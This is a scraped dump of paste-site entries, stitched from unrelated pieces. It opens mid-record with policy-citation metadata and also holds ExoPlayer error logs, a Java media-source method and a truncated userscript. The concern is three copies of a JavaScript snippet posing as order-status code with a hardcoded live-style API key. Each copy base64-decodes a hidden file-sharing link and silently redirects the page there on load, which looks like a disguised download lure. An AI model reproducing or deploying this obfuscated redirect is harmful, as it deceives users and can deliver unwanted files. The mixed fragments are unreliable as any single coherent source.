finance>economy""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=finnishgovernment-52a6031b52e49a47fac24cee8a8c4e9b""},{""policy_document_id"":""governmentofcanada-bd55c1719024c8f36173a3847ce0ad49"",""policy_source_id"":""governmentofcanada"",""source_title"":""Government of Canada"",""document_title"":""The impact of firm closures and job loss on participation in gig work : a casual analysis \/ Sung-Hee Jeon and Yuri Ostrovsky.:\u00a0CS11-0019\/466E-PDF Publications - Canada.ca"",""published_on"":""2022-01-01"",""document_url"":""http:\/\/publications.gc.ca\/site\/eng\/9.914792\/publication.html"",""type"":""government"",""subtype"":"""",""country"":""Canada"",""source_primary_classification"":""Public Sector"",""source_secondary_classification"":""Government"",""source_tertiary_classification"":""National Body|OVSEP|Mixed Roles|OVSEP|Public Service"",""topics"":[""Gig worker"",""Difference in differences"",""Statistics""],""classifications"":[""science and technology"",""labour"",""health""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=governmentofcanada-bd55c1719024c8f36173a3847ce0ad49""},{""policy_document_id"":""iadb-990199993e6457d66b60fe5bebe15ffb"",""policy_source_id"":""iadb"",""source_title"":""Inter-American Development Bank"",""document_title"":""Nudging Self-employed Women to Contribute to Social Security"",""published_on"":""2024-09-01"",""document_url"":""https:\/\/publications.iadb.org\/en\/nudging-self-employed-women-contribute-social-security"",""type"":""igo"",""subtype"":""development bank"",""country"":""IGO"",""source_primary_classification"":""Public Sector"",""source_secondary_classification"":""IGO"",""source_tertiary_classification"":""International Body|OVSEP|Financial Institution or Bank|OVSEP|Development Bank|OVSEP|Policy Centre"",""topics"":[""Pension"",""Self-employment"",""Nudge theory""],""classifications"":[""health"",""science and technology"",""health>healthcare policy>health insurance""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=iadb-990199993e6457d66b60fe5bebe15ffb""},{""policy_document_id"":""ifnsweden-93e756683815ad809bcacc1da6d6e279"",""policy_source_id"":""ifnsweden"",""source_title"":""Institutet f\u00f6r N\u00e4ringslivsforskning"",""document_title"":""Self-employed Immigrants and Their Employees: Evidence from Swedish Employer-Employee Data"",""published_on"":""2018-09-25"",""document_url"":""https:\/\/www.ifn.se\/media\/tz4fabx3\/wp1235.pdf"",""type"":""think tank"",""subtype"":""research centre"",""country"":""Sweden"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre|OVSEP|Policy Centre"",""topics"":[""Immigration"",""Self-employment"",""Immigration to Sweden""],""classifications"":[""science and technology"",""science and technology>social sciences>economics"",""society>demographics>immigration""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=ifnsweden-93e756683815ad809bcacc1da6d6e279""},{""policy_document_id"":""illinoisgov-971a6f3c75c64c69468be6dcb99e7680"",""policy_source_id"":""illinoisgov"",""source_title"":""State of Illinois"",""document_title"":""Illinois Adult Use Cannabis Industry Disparity Studies Report"",""published_on"":""2024-07-12"",""document_url"":""https:\/\/cannabis.illinois.gov\/content\/dam\/soi\/en\/web\/cannabis\/documents\/media\/reports-and-public-presentations\/Illinois-Adult-Use-Cannabis-Industry-Disparity-Study-Report-2024-07-12.pdf"",""type"":""government"",""subtype"":"""",""country"":""USA"",""source_primary_classification"":""Public Sector"",""source_secondary_classification"":""Government"",""source_tertiary_classification"":""Regional or State Level Body|OVSEP|Mixed Roles|OVSEP|Public Service"",""topics"":[""Equal Protection Clause"",""Intermediate scrutiny"",""Controlled Substances Act""],""classifications"":[""crime, law and justice>judiciary>court"",""science and technology"",""health""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=illinoisgov-971a6f3c75c64c69468be6dcb99e7680""},{""policy_document_id"":""imf-2076b7786484744bf5e1275b103b7696"",""policy_source_id"":""imf"",""source_title"":""International Monetary Fund"",""document_title"":""The Kingdom of the Netherlands\u2014Netherlands : Selected Issues"",""published_on"":""2019-02-12"",""document_url"":""https:\/\/www.imf.org\/en\/Publications\/CR\/Issues\/2019\/02\/12\/The-Kingdom-of-the-Netherlands-Netherlands-Selected-Issues-46593"",""type"":""igo"",""subtype"":"""",""country"":""IGO"",""source_primary_classification"":""Public Sector"",""source_secondary_classification"":""IGO"",""source_tertiary_classification"":""International Body|OVSEP|Financial Institution or Bank|OVSEP|Development Bank|OVSEP|Policy Centre"",""topics"":[""Pension"",""Dividend"",""Multinational corporation""],""classifications"":[""economy, business and finance>economy"",""labour"",""economy, business and finance>business information>business finance>earnings""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=imf-2076b7786484744bf5e1275b103b7696""},{""policy_document_id"":""imf-7555e123e7060d3f3b55402a29f0ce4b"",""policy_source_id"":""imf"",""source_title"":""International Monetary Fund"",""document_title"":""Self-Employment and Support for the Dutch Pension Reform"",""published_on"":""2019-03-19"",""document_url"":""https:\/\/www.imf.org\/en\/Publications\/WP\/Issues\/2019\/03\/19\/Self-Employment-and-Support-for-the-Dutch-Pension-Reform-46663"",""type"":""igo"",""subtype"":"""",""country"":""IGO"",""source_primary_classification"":""Public Sector"",""source_secondary_classification"":""IGO"",""source_tertiary_classification"":""International Body|OVSEP|Financial Institution or Bank|OVSEP|Development Bank|OVSEP|Policy Centre"",""topics"":[""Pension"",""Employment"",""Self-employment""],""classifications"":[""labour"",""science and technology"",""education""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=imf-7555e123e7060d3f3b55402a29f0ce4b""},{""policy_document_id"":""izade-4bb60448a93c9bbe37ec2a19e0f36e63"",""policy_source_id"":""izade"",""source_title"":""IZA Institute of Labor Economics"",""document_title"":""Does Solo Self-Employment Serve as a 'Stepping Stone' to Employership?"",""published_on"":""2019-12-12"",""document_url"":""https:\/\/www.iza.org\/publications\/dp\/12841\/does-solo-self-employment-serve-as-a-stepping-stone-to-employership"",""type"":""think tank"",""subtype"":"""",""country"":""Germany"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre|OVSEP|Policy Centre"",""topics"":[""Employment"",""IZA Institute of Labor Economics"",""Self-employment""],""classifications"":[""science and technology"",""labour"",""science and technology>social sciences""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=izade-4bb60448a93c9bbe37ec2a19e0f36e63""},{""policy_document_id"":""izade-5045dc5244d197f6dc6c8e83a2b2c27d"",""policy_source_id"":""izade"",""source_title"":""IZA Institute of Labor Economics"",""document_title"":""Poverty and Material Deprivation among the Self-Employed in Europe: An Exploration of a Relatively Uncharted Landscape"",""published_on"":""2017-08-30"",""document_url"":""https:\/\/www.iza.org\/publications\/dp\/11007\/poverty-and-material-deprivation-among-the-self-employed-in-europe-an-exploration-of-a-relatively-uncharted-landscape"",""type"":""think tank"",""subtype"":"""",""country"":""Germany"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre|OVSEP|Policy Centre"",""topics"":[""Self-employment"",""Employment"",""Working poor""],""classifications"":[""labour"",""science and technology"",""society""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=izade-5045dc5244d197f6dc6c8e83a2b2c27d""},{""policy_document_id"":""izade-6dcb741f44917ce1229e70c669d77364"",""policy_source_id"":""izade"",""source_title"":""IZA Institute of Labor Economics"",""document_title"":""Transitioning from Solo Self-Employed to Microbusiness Employer: Local Economic Environment or Owner Characteristics?"",""published_on"":""2019-02-19"",""document_url"":""https:\/\/www.iza.org\/publications\/dp\/12189\/transitioning-from-solo-self-employed-to-microbusiness-employer-local-economic-environment-or-owner-characteristics"",""type"":""think tank"",""subtype"":"""",""country"":""Germany"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre|OVSEP|Policy Centre"",""topics"":[""Entrepreneurship"",""Employment"",""IZA Institute of Labor Economics""],""classifications"":[""science and technology"",""education"",""labour""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=izade-6dcb741f44917ce1229e70c669d77364""},{""policy_document_id"":""izade-7d3b35b14f5619e08ce62f459aa90ad1"",""policy_source_id"":""izade"",""source_title"":""IZA Institute of Labor Economics"",""document_title"":""Self\u2010Employment amongst Migrant Groups in England and Wales: New Evidence from Census Microdata"",""published_on"":""2015-11-27"",""document_url"":""https:\/\/www.iza.org\/publications\/dp\/9539\/selfemployment-amongst-migrant-groups-in-england-and-wales-new-evidence-from-census-microdata"",""type"":""think tank"",""subtype"":"""",""country"":""Germany"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre|OVSEP|Policy Centre"",""topics"":[""Immigration"",""United Kingdom"",""Employment""],""classifications"":[""science and technology"",""politics"",""science and technology>social sciences""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=izade-7d3b35b14f5619e08ce62f459aa90ad1""},{""policy_document_id"":""izade-8c3e82f6fabe8c8b4aac2eec227df632"",""policy_source_id"":""izade"",""source_title"":""IZA Institute of Labor Economics"",""document_title"":""Does Education Enhance Entrepreneurship?"",""published_on"":""2021-08-17"",""document_url"":""https:\/\/www.iza.org\/publications\/dp\/14655\/does-education-enhance-entrepreneurship"",""type"":""think tank"",""subtype"":"""",""country"":""Germany"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre|OVSEP|Policy Centre"",""topics"":[""Entrepreneurship"",""Instrumental variables estimation"",""Ordinary least squares""],""classifications"":[""education"",""science and technology"",""economy, business and finance>economy""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=izade-8c3e82f6fabe8c8b4aac2eec227df632""},{""policy_document_id"":""izade-d7677a069940aaa5a2730f3bb8450b25"",""policy_source_id"":""izade"",""source_title"":""IZA Institute of Labor Economics"",""document_title"":""Immigration Policy and the Rise of Self-Employment among Mexican Immigrants"",""published_on"":""2020-12-04"",""document_url"":""https:\/\/www.iza.org\/publications\/dp\/13930\/immigration-policy-and-the-rise-of-self-employment-among-mexican-immigrants"",""type"":""think tank"",""subtype"":"""",""country"":""Germany"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre|OVSEP|Policy Centre"",""topics"":[""Unemployment"",""Immigration"",""Self-employment""],""classifications"":[""economy, business and finance>economy"",""science and technology"",""labour""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=izade-d7677a069940aaa5a2730f3bb8450b25""},{""policy_document_id"":""nber-5830daa93aff2ad4aa2da177e09adc34"",""policy_source_id"":""nber"",""source_title"":""NBER"",""document_title"":""Black and White: Access to Capital among Minority-Owned Startups"",""published_on"":""2020-11-30"",""document_url"":""https:\/\/www.nber.org\/papers\/w28154"",""type"":""think tank"",""subtype"":"""",""country"":""USA"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre"",""topics"":[""Loan"",""Economic inequality"",""Bank""],""classifications"":[""economy, business and finance>economy"",""economy, business and finance>economy>macro economics>credit and debt"",""economy, business and finance>market and exchange>loan market>loans""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=nber-5830daa93aff2ad4aa2da177e09adc34""},{""policy_document_id"":""rijksoverheid-fa3b5249144cf781ff845d24229f9f73"",""policy_source_id"":""rijksoverheid"",""source_title"":""Rijksoverheid"",""document_title"":""IMF Country Report No. 19\/45"",""published_on"":""2019-02-13"",""document_url"":""https:\/\/www.rijksoverheid.nl\/documenten\/kamerstukken\/2019\/02\/13\/imf-country-report-no.-19-45"",""type"":""government"",""subtype"":"""",""country"":""Netherlands"",""source_primary_classification"":""Public Sector"",""source_secondary_classification"":""Government"",""source_tertiary_classification"":""National Body|OVSEP|Mixed Roles|OVSEP|Public Service"",""topics"":[""Pension"",""Dividend"",""Employment""],""classifications"":[""economy, business and finance>economy"",""labour"",""labour>retirement""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=rijksoverheid-fa3b5249144cf781ff845d24229f9f73""},{""policy_document_id"":""seoamsterecon-9ecdb923c08b73a785955c03e8e270a4"",""policy_source_id"":""seoamsterecon"",""source_title"":""SEO Amsterdam Economics"",""document_title"":""Evaluatie fiscale ondernemerschapsregelingen"",""published_on"":""2024-06-17"",""document_url"":""https:\/\/www.seo.nl\/publicaties\/evaluatie-fiscale-ondernemerschapsregelingen\/"",""type"":""think tank"",""subtype"":""university affiliated"",""country"":""Netherlands"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre|OVSEP|Policy Centre"",""topics"":[""Entrepreneurship"",""General partnership"",""Tax""],""classifications"":[""economy, business and finance>economy"",""science and technology"",""science and technology>social sciences>economics""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=seoamsterecon-9ecdb923c08b73a785955c03e8e270a4""},{""policy_document_id"":""snsse-40979e6618fd2c0146d67a004efe1c81"",""policy_source_id"":""snsse"",""source_title"":""Studief\u00f6rbundet N\u00e4ringsliv och Samh\u00e4lle"",""document_title"":""SNS Analys nr 52. Bidrar etnisk segregation till mer egenf\u00f6retagande? - SNS"",""published_on"":""2018-12-10"",""document_url"":""https:\/\/www.sns.se\/aktuellt\/sns-analys-nr-52-bidrar-etnisk-segregation-till-mer-egenforetagande\/"",""type"":""think tank"",""subtype"":"""",""country"":""Sweden"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre|OVSEP|Policy Centre"",""topics"":[""Sweden"",""Information"",""Racial segregation""],""classifications"":[""science and technology"",""politics"",""labour""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=snsse-40979e6618fd2c0146d67a004efe1c81""}],""cited_by_pdf_document_id"":[""aerckenya-32896d244b77f9c67ed75a16519691db-babf0ed3529f704bbaec5bec95bad0a5"",""aerckenya-da78ba25f3dea93b39b3f4f3ac5fe328-8e6ee47b979683665bab235eccaf877b"",""finnishgovernment-52a6031b52e49a47fac24cee8a8c4e9b-8d5e6020a29f78afcddd04cb0b1ee966"",""governmentofcanada-bd55c1719024c8f36173a3847ce0ad49-c6f49541b986e959db2fabce891c4a12"",""iadb-990199993e6457d66b60fe5bebe15ffb-bd5622871fb8a060e7349bd6905e0a05"",""ifnsweden-93e756683815ad809bcacc1da6d6e279-93e756683815ad809bcacc1da6d6e279"",""illinoisgov-971a6f3c75c64c69468be6dcb99e7680-971a6f3c75c64c69468be6dcb99e7680"",""imf-2076b7786484744bf5e1275b103b7696-6053129262a5d6409df7c00a1bf63829"",""imf-7555e123e7060d3f3b55402a29f0ce4b-80d2568b36da1f05f124df8392f11152"",""izade-4bb60448a93c9bbe37ec2a19e0f36e63-2bd8fb606c8e56f2c71e637cf7a46fc2"",""izade-5045dc5244d197f6dc6c8e83a2b2c27d-5ede66a5837d68703fa09f49af14c4ba"",""izade-6dcb741f44917ce1229e70c669d77364-b714e4199ced8f2330ac8b37bb2b64be"",""izade-7d3b35b14f5619e08ce62f459aa90ad1-677252ca249ac4f19664afe7a1e072c6"",""izade-8c3e82f6fabe8c8b4aac2eec227df632-5446d26a0595a2b0c9ef4f3c8eb95207"",""izade-d7677a069940aaa5a2730f3bb8450b25-a4cad335b3df01fc060e3c165974e151"",""nber-5830daa93aff2ad4aa2da177e09adc34-dc9961f27d435f49b08cc4d9a1cb5a17"",""rijksoverheid-fa3b5249144cf781ff845d24229f9f73-42540fad6b94c260c08d87091c4e46e9"",""seoamsterecon-9ecdb923c08b73a785955c03e8e270a4-5a7c60a947d06fa66a8e011410e68736"",""snsse-40979e6618fd2c0146d67a004efe1c81-0cd305b08f3dd77e768ca9590fd49f0d""],""oa_status"":""green"",""last_cited"":""2024-12-02"",""with_journal_subject"":[],""medline_mesh"":[],""citing_classifications"":[""economy, business and finance>economy"",""science and technology"",""science and technology>social sciences>economics"",""economy, business and finance>economic sector>financial and business service>banking"",""economy, business and finance>business information>human resources>management"",""labour"",""society"",""economy, business and finance>economic sector"",""economy, business and finance"",""health"",""labour>unemployment"",""health>healthcare policy>health insurance"",""labour>employment"",""economy, business and finance>economic sector>financial and business service>insurance"",""conflicts, war and peace>armed conflict>war"",""society>demographics>immigration"",""crime, law and justice>judiciary>court"",""politics>government"",""economy, business and finance>business information>business finance>earnings"",""economy, business and finance>economy>macro economics>investments"",""economy, business and finance>business information>business finance"",""politics"",""labour>retirement"",""education"",""science and technology>social sciences"",""science and technology>mathematics"",""society>values"",""society>social condition"",""education>school>higher education>university"",""education>school>further education"",""society>demographics"",""economy, business and finance>economy>macro economics>credit and debt"",""economy, business and finance>market and exchange>loan market>loans"",""society>discrimination"",""arts, culture and entertainment>culture""]}]}}"
rTdzQrye,Untitled,dentira,JavaScript,Friday 11th of April 2025 08:26:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20703/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fSVWC19b,2025-04-11T15:13:37.808,powerampache,PHP,Friday 11th of April 2025 08:13:38 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 502
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 502 - Bad Gateway - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 502 - Bad Gateway
 {""headerFields"":{""null"":[""HTTP/1.1 502 Bad Gateway""],""Connection"":[""keep-alive""],""Content-Length"":[""157""],""Content-Type"":[""text/html""],""Date"":[""Fri, 11 Apr 2025 13:13:38 GMT""],""Referrer-Policy"":[""no-referrer""],""Server"":[""nginx/1.18.0""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains""],""X-Android-Received-Millis"":[""1744377217787""],""X-Android-Response-Source"":[""NETWORK 502""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1744377217766""],""X-Content-Type-Options"":[""nosniff""],""X-Download-Options"":[""noopen""],""X-Frame-Options"":[""SAMEORIGIN""],""X-Permitted-Cross-Domain-Policies"":[""none""],""X-Robots-Tag"":[""none""],""X-XSS-Protection"":[""1; mode\u003dblock""]},""responseBody"":[60,104,116,109,108,62,13,10,60,104,101,97,100,62,60,116,105,116,108,101,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,116,105,116,108,101,62,60,47,104,101,97,100,62,13,10,60,98,111,100,121,62,13,10,60,99,101,110,116,101,114,62,60,104,49,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,104,49,62,60,47,99,101,110,116,101,114,62,13,10,60,104,114,62,60,99,101,110,116,101,114,62,110,103,105,110,120,47,49,46,50,55,46,52,60,47,99,101,110,116,101,114,62,13,10,60,47,98,111,100,121,62,13,10,60,47,104,116,109,108,62,13,10],""responseCode"":502,""responseMessage"":""Bad Gateway"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 502"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]}"
zcnu7U9Y,2025-04-11T15:10:55.283,powerampache,PHP,Friday 11th of April 2025 08:10:55 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 502
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 502 - Bad Gateway - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 502 - Bad Gateway
 {""headerFields"":{""null"":[""HTTP/1.1 502 Bad Gateway""],""Connection"":[""keep-alive""],""Content-Length"":[""157""],""Content-Type"":[""text/html""],""Date"":[""Fri, 11 Apr 2025 13:10:55 GMT""],""Referrer-Policy"":[""no-referrer""],""Server"":[""nginx/1.18.0""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains""],""X-Android-Received-Millis"":[""1744377055269""],""X-Android-Response-Source"":[""NETWORK 502""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1744377055236""],""X-Content-Type-Options"":[""nosniff""],""X-Download-Options"":[""noopen""],""X-Frame-Options"":[""SAMEORIGIN""],""X-Permitted-Cross-Domain-Policies"":[""none""],""X-Robots-Tag"":[""none""],""X-XSS-Protection"":[""1; mode\u003dblock""]},""responseBody"":[60,104,116,109,108,62,13,10,60,104,101,97,100,62,60,116,105,116,108,101,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,116,105,116,108,101,62,60,47,104,101,97,100,62,13,10,60,98,111,100,121,62,13,10,60,99,101,110,116,101,114,62,60,104,49,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,104,49,62,60,47,99,101,110,116,101,114,62,13,10,60,104,114,62,60,99,101,110,116,101,114,62,110,103,105,110,120,47,49,46,50,55,46,52,60,47,99,101,110,116,101,114,62,13,10,60,47,98,111,100,121,62,13,10,60,47,104,116,109,108,62,13,10],""responseCode"":502,""responseMessage"":""Bad Gateway"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 502"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]}"
hRwRy2vA,Products.js,dentira,JavaScript,Friday 11th of April 2025 08:10:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/74122/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sHXMVhwU,Order.js,dentira,JavaScript,Friday 11th of April 2025 07:55:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16222/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0H9B7263,ExoPlayer buildMediaSource Method,solodroid,Java,Friday 11th of April 2025 07:47:23 AM CDT,"    @SuppressLint(""SwitchIntDef"")
    private MediaSource buildMediaSource(Uri uri, DefaultDataSource.Factory dataSourceFactory) {
        MediaItem mMediaItem = MediaItem.fromUri(Uri.parse(String.valueOf(uri)));
        int type = TextUtils.isEmpty(null) ? Util.inferContentType(uri) : Util.inferContentType(""."" + null);
        switch (type) {
            case C.TYPE_DASH:
                return new DashMediaSource.Factory(dataSourceFactory)
                        .createMediaSource(mMediaItem);
            case C.TYPE_HLS:
                return new HlsMediaSource.Factory(dataSourceFactory)
                        .setAllowChunklessPreparation(true)
                        .createMediaSource(mMediaItem);
            case C.TYPE_OTHER:
                if (uri.toString().contains("".m3u8"")) {
                    return new HlsMediaSource.Factory(dataSourceFactory)
                            .setAllowChunklessPreparation(true)
                            .createMediaSource(mMediaItem);
                } else {
                    return new ProgressiveMediaSource.Factory(dataSourceFactory, new DefaultExtractorsFactory())
                            .createMediaSource(mMediaItem);
                }
            case C.TYPE_RTSP:
                return new RtspMediaSource.Factory()
                        .createMediaSource(MediaItem.fromUri(uri));
            default: {
                throw new IllegalStateException(""Unsupported type: "" + type);
            }
        }
    }"
dfT2UrUQ,Remove YouTube Sponsored Label Overlay,deuxdoom,JavaScript,Friday 11th of April 2025 07:41:04 AM CDT,"// ==UserScript==
// @name         Remove YouTube Sponsored Label Overlay
// @namespace    http://tampermonkey.net/
// @version      1.0
